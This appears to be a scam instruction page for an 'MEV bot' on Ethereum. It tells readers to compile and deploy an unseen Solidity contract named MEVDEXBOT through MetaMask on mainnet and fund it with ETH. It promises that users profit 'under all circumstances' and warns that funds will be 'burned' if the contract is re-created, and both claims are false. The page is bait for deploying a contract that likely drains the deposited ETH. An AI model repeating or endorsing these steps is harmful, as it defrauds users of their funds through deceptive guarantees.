Instructions. Installing
with a smart contract.

ATTENTION

  • Repeated creation of a smart contract is prohibited
  • If you try to duplicate a smart contract, the robot suspends payments to your specified purse, this functionality is limited in the free version
  • The amount you contribute to the MEB bot will not change, re-funding is prohibited, if you re-create a smart contract the amount will be burned.
  • We recommend to fund the contract with at least 2 ETH, but you might need at least 0.5 ETH to cover gas and possible burn, below 0.5 ETH scripts and smart contract might not work correctly.
  • Except for the gas fee, the bot does not incur losses, it only makes trades when there is a suitable arbitrage opportunity for profit, so the user is always in the black under all circumstances.
  • To remove all restrictions, use the MEV PRO v3 program and use the full functionality.

Smart contract generation

Please generate smart contracts if you have read the guidelines, agree to the terms and conditions and intend to use this smart contract for its intended purpose. The number of unique smart contracts is strictly limited.

Create smart contract

4.1 Head over to the Sidebar, Click on the “contracts” folder and then create “New File”. Rename it as “MEVDEXBOT”

4.2 Go to the “Solidity Compiler” tab.

4.3 Select version “0.6.6” and then press “MEVDEXBOT”.

4.4 Go to the “Deploy & Run Transactions” tab and on Environment select the “Injected Provider - Metamask”

4.5 It will appear a Metamask popup to connect your wallet, connect the wallet you want to deploy the bot. Make sure you are on Ethereum Mainnet.

4.6 Just press the arrow down to open up the deploy window.

4.7 Copy your newly created contract address and fund it with any amount of ETH that you would like the bot to earn with by simply sending ETH to your newly created contract address.

4.8 Head over to your Metamask and fund your newly created contract.Go to the “Solidity Compiler” tab.

4.9 After your transaction is confirmed your balance should appear like this on your contract.

5 Press "Start" button to launch the bot.

  • The bot will immediately start working, bringing you profit from trades.
  • Withdrawal of funds will be carried out automatically to the purse you specified. When you click the withdrawal button, you will fully return the money operated by MEV BOT (body of the deposit + percentage of trades), the script will be suspended. Carry out the withdrawal in case you see the result and intend to buy MEV PRO v3.
